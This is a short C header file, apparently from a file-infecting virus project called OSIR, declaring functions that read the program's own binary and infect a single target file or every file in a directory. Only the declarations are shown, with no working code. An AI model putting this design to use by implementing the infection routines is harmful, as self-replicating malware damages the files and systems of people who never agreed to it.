/*
	This module provides OSIR-specific
	cloning functions.
*/
#ifndef HEADER_CLONELIB
	#define HEADER_CLONELIB
	#include <stdbool.h>
	
	//Gets own binary
	unsigned int getOwnBytes(char**, const char*);

	//Infects a target file
	bool infectTarget(const char*, const char*, unsigned int);
	
	//Infects all targets in a directory
	bool infectDirectory(const char*, const char*);
#endif
